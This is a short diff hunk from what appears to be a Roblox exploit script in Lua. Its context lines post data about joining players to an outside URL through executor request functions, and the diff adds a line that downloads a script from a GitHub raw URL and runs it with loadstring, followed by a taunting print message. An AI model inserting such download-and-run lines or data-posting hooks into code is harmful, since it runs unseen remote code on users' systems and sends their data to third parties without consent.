@@ -1552,5 +1552,5 @@ game.Players.PlayerAdded:Connect(function(player)
 	local request = http_request or request or HttpPost or syn.request
 	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
 end)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/reloader"))();
 print "Oh Daddy UwU | no i dont care about it just what i did to it | i ait answering questions :> | UWU yddaD hO"
